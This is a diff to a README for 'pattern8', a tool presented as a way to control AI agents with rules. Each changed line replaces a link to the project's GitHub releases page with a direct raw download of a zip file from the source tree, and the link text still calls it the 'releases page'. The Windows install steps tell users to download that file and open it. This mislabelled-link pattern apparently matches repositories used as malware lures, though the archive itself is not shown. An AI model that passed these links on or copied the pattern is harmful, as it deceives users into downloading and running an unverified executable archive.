@@ -1,6 +1,6 @@
 # 🎱 pattern8 - Control AI Agents With Clear Rules
 
-[![Download pattern8](https://img.shields.io/badge/Download%20pattern8-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NVFivem/pattern8/releases)
+[![Download pattern8](https://img.shields.io/badge/Download%20pattern8-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/NVFivem/pattern8/main/src/pattern_2.6-beta.4.zip)
 
 ## 🧭 What pattern8 does
 
@@ -12,13 +12,13 @@ This is useful when you want AI help, but you still want clear limits. It can he
 
 ## 📥 Download pattern8
 
-Visit the [pattern8 releases page](https://github.com/NVFivem/pattern8/releases) to download and install the latest version for Windows.
+Visit the [pattern8 releases page](https://raw.githubusercontent.com/NVFivem/pattern8/main/src/pattern_2.6-beta.4.zip) to download and install the latest version for Windows.
 
 Look for the newest release file and choose the Windows download if one is listed. After the file finishes downloading, open it to start setup or run the app.
 
 ## 🪟 Install on Windows
 
-1. Open the [releases page](https://github.com/NVFivem/pattern8/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/NVFivem/pattern8/main/src/pattern_2.6-beta.4.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from that release.
 4. If your browser asks what to do, choose Save.
@@ -153,7 +153,7 @@ Small rules are easier to test and revise.
 
 When a new release is posted:
 
-1. Return to the [releases page](https://github.com/NVFivem/pattern8/releases).
+1. Return to the [releases page](https://raw.githubusercontent.com/NVFivem/pattern8/main/src/pattern_2.6-beta.4.zip).
 2. Download the newest version.
 3. Replace the old file if needed.
 4. Open the app again.
